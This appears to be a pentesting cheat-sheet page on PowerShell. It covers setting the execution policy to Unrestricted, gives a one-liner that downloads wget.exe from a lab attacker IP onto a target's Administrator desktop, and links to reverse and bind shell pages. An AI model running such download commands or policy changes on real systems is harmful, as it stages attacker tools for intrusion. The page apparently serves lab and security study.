# PowerShell

## Enable PowerShell execution policy

* PowerShell maintains an execution policy that determines which type of PowerShell scripts (if any) can be run on the system.&#x20;
* The default policy is “Restricted”, which effectively means the system will neither load PowerShell configuration files nor run PowerShell scripts.
* To set an “Unrestricted” execution policy on our Windows client machine. Run Windows PowerShell application as Administrator.

```
PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted
PS C:\WINDOWS\system32> Get-ExecutionPolicy
```

![](https://lh4.googleusercontent.com/5eEcCVnnBLRd4iYiO9ze7W9ow-L\_EkITQKx0WQo3mPVeLasOK\_lj2QkoU84hf5M4mTVY1ePTk214edOgr2d\_EdpcXLwT1fRksnqihgTjFayRaPYbODWJtbKUfuI328\_f-a3tL8aa)

## File Transfers

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.189/wget.exe','C:\Users\Administrator\Desktop\wget.exe')"
```

Also see:

{% content-ref url="../../collections/file-transfer.md" %}
[file-transfer.md](../../collections/file-transfer.md)
{% endcontent-ref %}

## Reverse/Bind Shells

See the following:

{% content-ref url="../../collections/reverse-shell/powershell-1.md" %}
[powershell-1.md](../../collections/reverse-shell/powershell-1.md)
{% endcontent-ref %}

{% content-ref url="../../collections/bind-shell/powershell.md" %}
[powershell.md](../../collections/bind-shell/powershell.md)
{% endcontent-ref %}

